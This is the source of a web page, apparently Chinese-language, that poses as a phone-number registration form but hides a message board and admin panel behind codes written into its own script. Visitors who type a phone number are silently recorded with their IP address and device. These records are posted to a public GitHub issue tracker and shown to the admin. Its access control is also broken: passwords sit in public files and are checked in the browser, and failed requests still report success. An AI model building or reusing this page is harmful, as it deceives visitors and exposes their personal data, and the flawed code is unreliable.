<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>注册</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
        }
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        /* 通用卡片样式 */
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 420px;
            padding: 48px 32px;
        }
        /* 注册页面样式 */
        #registerPage h1 {
            font-size: 28px;
            font-weight: 600;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 8px;
        }
        #registerPage .desc {
            color: #666;
            font-size: 15px;
            text-align: center;
            margin-bottom: 40px;
        }
        .input-box {
            position: relative;
            margin-bottom: 24px;
        }
        .input-box input {
            width: 100%;
            height: 52px;
            padding: 0 16px;
            font-size: 16px;
            border: 1px solid #e5e5e5;
            border-radius: 10px;
            outline: none;
            transition: all 0.2s;
        }
        .input-box input:focus {
            border-color: #007aff;
            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
        }
        .btn {
            width: 100%;
            height: 52px;
            font-size: 16px;
            font-weight: 500;
            border: none;
            border-radius: 10px;
            background: #007aff;
            color: white;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn:hover {
            background: #0066cc;
            transform: translateY(-1px);
        }
        .btn:active {
            transform: translateY(0);
        }
        .btn-secondary {
            background: #f2f2f7;
            color: #1a1a1a;
            width: auto;
            padding: 0 20px;
            height: 40px;
            font-size: 14px;
        }
        .btn-secondary:hover {
            background: #e5e5ea;
        }
        .btn-danger {
            background: #ff3b30;
        }
        .btn-danger:hover {
            background: #d70015;
        }
        /* 提示框 */
        .toast {
            position: fixed;
            top: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
        }
        .toast.show {
            opacity: 1;
        }
        /* 隐藏类 */
        .hidden {
            display: none !important;
        }
        /* 留言板页面 */
        .page {
            width: 100%;
            max-width: 600px;
        }
        .page-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        .page-header h2 {
            font-size: 22px;
            font-weight: 600;
            color: #1a1a1a;
        }
        .message-input {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
        }
        .message-input textarea {
            width: 100%;
            min-height: 100px;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #e5e5e5;
            border-radius: 8px;
            outline: none;
            resize: vertical;
            margin-bottom: 12px;
            transition: border-color 0.2s;
        }
        .message-input textarea:focus {
            border-color: #007aff;
        }
        .message-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .message-item {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
            position: relative;
        }
        .message-item .content {
            font-size: 16px;
            line-height: 1.6;
            color: #1a1a1a;
            margin-bottom: 12px;
            word-break: break-word;
        }
        .message-item .meta {
            font-size: 12px;
            color: #999;
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
        }
        .message-item .delete-btn {
            position: absolute;
            top: 16px;
            right: 16px;
            background: #ff3b30;
            color: white;
            border: none;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
        }
        .empty-tip {
            text-align: center;
            color: #999;
            padding: 40px 0;
            font-size: 14px;
        }
        /* 管理后台页面 */
        .admin-tabs {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        .admin-tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            background: white;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            color: #666;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            transition: all 0.2s;
        }
        .admin-tab.active {
            background: #007aff;
            color: white;
        }
        .admin-section {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
        }
        .admin-section h3 {
            font-size: 16px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 16px;
        }
        .admin-section .btn-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .pwd-input {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }
        .pwd-input input {
            flex: 1;
            min-width: 200px;
            height: 40px;
            padding: 0 12px;
            font-size: 14px;
            border: 1px solid #e5e5e5;
            border-radius: 8px;
            outline: none;
        }
        .log-item {
            background: #fff8e1;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 12px;
            position: relative;
        }
        .log-item .content {
            font-size: 14px;
            color: #b45309;
            margin-bottom: 8px;
        }
        .log-item .meta {
            font-size: 12px;
            color: #d97706;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>
    <div id="toast" class="toast"></div>

    <!-- 伪装注册页面（首页） -->
    <div id="registerPage" class="card">
        <h1>完成注册</h1>
        <p class="desc">请输入手机号继续</p>
        <div class="input-box">
            <input type="text" id="phoneInput" placeholder="请输入正确的手机号" maxlength="20">
        </div>
        <button class="btn" onclick="verify()">发送验证码</button>
    </div>

    <!-- 普通用户留言板页面 -->
    <div id="messagePage" class="page hidden">
        <div class="page-header">
            <h2>留言板</h2>
            <button class="btn btn-secondary" onclick="goBack()">返回</button>
        </div>
        <div class="message-input">
            <textarea id="messageInput" placeholder="写下你想说的话..."></textarea>
            <button class="btn" onclick="submitMessage()">发布留言</button>
        </div>
        <div class="message-list" id="messageList">
            <div class="empty-tip">加载中...</div>
        </div>
    </div>

    <!-- 管理员后台页面 -->
    <div id="adminPage" class="page hidden">
        <div class="page-header">
            <h2>管理后台</h2>
            <button class="btn btn-secondary" onclick="goBack()">返回</button>
        </div>
        <div class="admin-section">
            <h3>密码管理</h3>
            <div class="pwd-input">
                <input type="password" id="newPwdInput" placeholder="输入新的普通用户密码">
                <button class="btn" onclick="changePassword()">修改密码</button>
            </div>
        </div>
        <div class="admin-tabs">
            <div class="admin-tab active" onclick="switchAdminTab('messages')">留言记录</div>
            <div class="admin-tab" onclick="switchAdminTab('logs')">操作记录</div>
        </div>
        <div id="messagesTab" class="admin-content">
            <div class="admin-section">
                <div class="btn-group">
                    <button class="btn btn-danger" onclick="clearMessages()">一键清空所有留言</button>
                </div>
                <div class="message-list" id="adminMessageList">
                    <div class="empty-tip">加载中...</div>
                </div>
            </div>
        </div>
        <div id="logsTab" class="admin-content hidden">
            <div class="admin-section">
                <div class="btn-group">
                    <button class="btn btn-danger" onclick="clearLogs()">一键清空所有操作记录</button>
                </div>
                <div class="message-list" id="logList">
                    <div class="empty-tip">加载中...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // 配置信息（已帮你填好，不用改）
        const OWNER = "luket995566";
        const REPO = "messagesboard";
        const FILE = "messages.json";
        const DATA_URL = `https://raw.githubusercontent.com/${OWNER}/${REPO}/main/${FILE}?t=${Date.now()}`;
        const ISSUE_URL = `https://api.github.com/repos/${OWNER}/${REPO}/issues`;

        let currentData = null;
        let userIP = "未知IP";
        let userDevice = "未知设备";

        // 初始化获取用户信息
        async function init() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIP = ipData.ip;
            } catch (e) {}

            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) userDevice = 'iPhone';
            else if (ua.includes('Android')) userDevice = 'Android';
            else if (ua.includes('Windows')) userDevice = 'Windows';
            else if (ua.includes('Mac')) userDevice = 'Mac';
            else if (ua.includes('iPad')) userDevice = 'iPad';
        }

        // 权限验证（严格按照要求）
        async function verify() {
            const input = document.getElementById('phoneInput').value.trim();
            
            // 错误输入：记录日志+提示
            if (input !== '995566' && input !== '995566995566') {
                await sendRequest('操作', {
                    type: 'addLog',
                    data: {
                        phone: input,
                        ip: userIP,
                        device: userDevice,
                        time: new Date().toLocaleString('zh-CN')
                    }
                });
                alert('请输入正确的手机号');
                return;
            }

            // 加载数据
            try {
                const res = await fetch(DATA_URL);
                currentData = await res.json();
            } catch (e) {
                showToast('加载失败，请稍后重试');
                return;
            }

            // 正确输入：无提示直接跳转
            if (input === currentData.normalPwd) {
                document.getElementById('registerPage').classList.add('hidden');
                document.getElementById('messagePage').classList.remove('hidden');
                loadMessages();
            } else if (input === currentData.adminPwd) {
                document.getElementById('registerPage').classList.add('hidden');
                document.getElementById('adminPage').classList.remove('hidden');
                loadAdminMessages();
                loadLogs();
            }
        }

        // 发送请求（通过Issue，匿名可用）
        async function sendRequest(title, data) {
            try {
                await fetch(ISSUE_URL, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/vnd.github.v3+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        title: title,
                        body: JSON.stringify(data)
                    })
                });
                return true;
            } catch (e) {
                console.error('请求失败:', e);
                return false;
            }
        }

        // 发布留言
        async function submitMessage() {
            const content = document.getElementById('messageInput').value.trim();
            if (!content) {
                showToast('请输入留言内容');
                return;
            }

            showToast('正在发布...');
            const success = await sendRequest('留言', {
                content: content,
                ip: userIP,
                device: userDevice,
                time: new Date().toLocaleString('zh-CN')
            });

            if (success) {
                showToast('发布成功');
                document.getElementById('messageInput').value = '';
                setTimeout(loadMessages, 3000);
            } else {
                showToast('发布失败，请稍后重试');
            }
        }

        // 加载留言
        async function loadMessages() {
            try {
                const res = await fetch(DATA_URL);
                currentData = await res.json();
                const list = document.getElementById('messageList');
                
                if (currentData.messages.length === 0) {
                    list.innerHTML = '<div class="empty-tip">暂无留言，快来抢沙发吧！</div>';
                    return;
                }

                list.innerHTML = currentData.messages.map(msg => `
                    <div class="message-item">
                        <div class="content">${escapeHtml(msg.content)}</div>
                        <div class="meta">
                            <span>📍 ${msg.ip}</span>
                            <span>📱 ${msg.device}</span>
                            <span>🕐 ${msg.time}</span>
                        </div>
                    </div>
                `).join('');
            } catch (e) {
                document.getElementById('messageList').innerHTML = '<div class="empty-tip" style="color: #ff3b30;">加载失败，请刷新重试</div>';
            }
        }

        // 管理员加载留言
        async function loadAdminMessages() {
            try {
                const res = await fetch(DATA_URL);
                currentData = await res.json();
                const list = document.getElementById('adminMessageList');
                
                if (currentData.messages.length === 0) {
                    list.innerHTML = '<div class="empty-tip">暂无留言</div>';
                    return;
                }

                list.innerHTML = currentData.messages.map((msg, index) => `
                    <div class="message-item">
                        <button class="delete-btn" onclick="deleteMessage(${index})">删除</button>
                        <div class="content">${escapeHtml(msg.content)}</div>
                        <div class="meta">
                            <span>📍 ${msg.ip}</span>
                            <span>📱 ${msg.device}</span>
                            <span>🕐 ${msg.time}</span>
                        </div>
                    </div>
                `).join('');
            } catch (e) {
                document.getElementById('adminMessageList').innerHTML = '<div class="empty-tip" style="color: #ff3b30;">加载失败，请刷新重试</div>';
            }
        }

        // 删除单条留言
        async function deleteMessage(index) {
            if (!confirm('确定要删除这条留言吗？')) return;
            
            showToast('正在删除...');
            const success = await sendRequest('操作', { type: 'deleteMsg', index: index });
            
            if (success) {
                showToast('删除成功');
                setTimeout(loadAdminMessages, 3000);
            } else {
                showToast('删除失败，请稍后重试');
            }
        }

        // 清空所有留言
        async function clearMessages() {
            if (!confirm('确定要清空所有留言吗？此操作不可恢复！')) return;
            
            showToast('正在清空...');
            const success = await sendRequest('操作', { type: 'clearMsg' });
            
            if (success) {
                showToast('清空成功');
                setTimeout(loadAdminMessages, 3000);
            } else {
                showToast('清空失败，请稍后重试');
            }
        }

        // 加载操作日志
        async function loadLogs() {
            try {
                const res = await fetch(DATA_URL);
                currentData = await res.json();
                const list = document.getElementById('logList');
                
                if (currentData.logs.length === 0) {
                    list.innerHTML = '<div class="empty-tip">暂无操作记录</div>';
                    return;
                }

                list.innerHTML = currentData.logs.map((log, index) => `
                    <div class="log-item">
                        <button class="delete-btn" onclick="deleteLog(${index})">删除</button>
                        <div class="content">尝试输入手机号：${escapeHtml(log.phone)}</div>
                        <div class="meta">
                            <span>📍 ${log.ip}</span>
                            <span>📱 ${log.device}</span>
                            <span>🕐 ${log.time}</span>
                        </div>
                    </div>
                `).join('');
            } catch (e) {
                document.getElementById('logList').innerHTML = '<div class="empty-tip" style="color: #ff3b30;">加载失败，请刷新重试</div>';
            }
        }

        // 删除单条日志
        async function deleteLog(index) {
            if (!confirm('确定要删除这条记录吗？')) return;
            
            showToast('正在删除...');
            const success = await sendRequest('操作', { type: 'deleteLog', index: index });
            
            if (success) {
                showToast('删除成功');
                setTimeout(loadLogs, 3000);
            } else {
                showToast('删除失败，请稍后重试');
            }
        }

        // 清空所有日志
        async function clearLogs() {
            if (!confirm('确定要清空所有操作记录吗？此操作不可恢复！')) return;
            
            showToast('正在清空...');
            const success = await sendRequest('操作', { type: 'clearLog' });
            
            if (success) {
                showToast('清空成功');
                setTimeout(loadLogs, 3000);
            } else {
                showToast('清空失败，请稍后重试');
            }
        }

        // 修改普通用户密码
        async function changePassword() {
            const newPwd = document.getElementById('newPwdInput').value.trim();
            if (!newPwd) {
                showToast('请输入新密码');
                return;
            }
            
            showToast('正在修改...');
            const success = await sendRequest('操作', { type: 'changePwd', newPwd: newPwd });
            
            if (success) {
                showToast('修改成功');
                document.getElementById('newPwdInput').value = '';
            } else {
                showToast('修改失败，请稍后重试');
            }
        }

        // 切换管理员标签页
        function switchAdminTab(tab) {
            document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.admin-content').forEach(c => c.classList.add('hidden'));
            
            if (tab === 'messages') {
                document.querySelectorAll('.admin-tab')[0].classList.add('active');
                document.getElementById('messagesTab').classList.remove('hidden');
            } else if (tab === 'logs') {
                document.querySelectorAll('.admin-tab')[1].classList.add('active');
                document.getElementById('logsTab').classList.remove('hidden');
            }
        }

        // 返回注册页面
        function goBack() {
            document.getElementById('messagePage').classList.add('hidden');
            document.getElementById('adminPage').classList.add('hidden');
            document.getElementById('registerPage').classList.remove('hidden');
            document.getElementById('phoneInput').value = '';
            currentData = null;
        }

        // 显示顶部提示
        function showToast(text) {
            const toast = document.getElementById('toast');
            toast.textContent = text;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        }

        // HTML转义防止XSS
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // 页面加载完成后初始化
        window.onload = init;
    </script>
</body>
</html>
